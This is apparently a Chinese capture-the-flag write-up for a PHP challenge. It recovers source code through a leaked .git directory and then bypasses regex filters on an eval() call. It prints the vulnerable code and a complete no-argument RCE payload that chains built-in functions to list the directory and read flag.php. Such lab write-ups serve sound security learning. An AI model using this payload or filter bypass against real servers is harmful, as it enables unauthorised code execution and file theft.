# 知识点：

# 1.无参数rce

# 2. .git源码泄露



此题类似于：字节跳动 bring code



# 1. 扫描发现存在.git目录



## 2.githacker下载源码

```javascript
<?php
include "flag.php";
echo "flag在哪里呢？<br>";
if(isset($_GET['exp'])){
    if (!preg_match('/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i', $_GET['exp'])) {
        if(';' === preg_replace('/[a-z,_]+\((?R)?\)/', NULL, $_GET['exp'])) {
            if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) {
                // echo $_GET['exp'];
                @eval($_GET['exp']);
            }
            else{
                die("还差一点哦！");
            }
        }
        else{
            die("再好好想想！");
        }
    }
    else{
        die("还想读flag，臭弟弟！");
    }
}
// highlight_file(__FILE__);
?>
```



# 3.存在flag.php文件和eval函数

说明需要rce读取flag.php文件的内容



# 4.正则：/[a-z,_]+\((?R)?\)/

只允许无参数的函数执行，列如：a(b())；这种，而a('ls')；则不行

且禁用了伪协议。



# 5.构造payload:

```javascript
echo(readfile(array_rand(array_flip(scandir(chr(ceil(sinh(cosh(tan(floor(
sqrt(floor(phpversion())))))))))))));

chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))))))
//chr(46)  :   .
array_rand : //从数组中随机取出一个键
array_filp : //交换数组键值
```







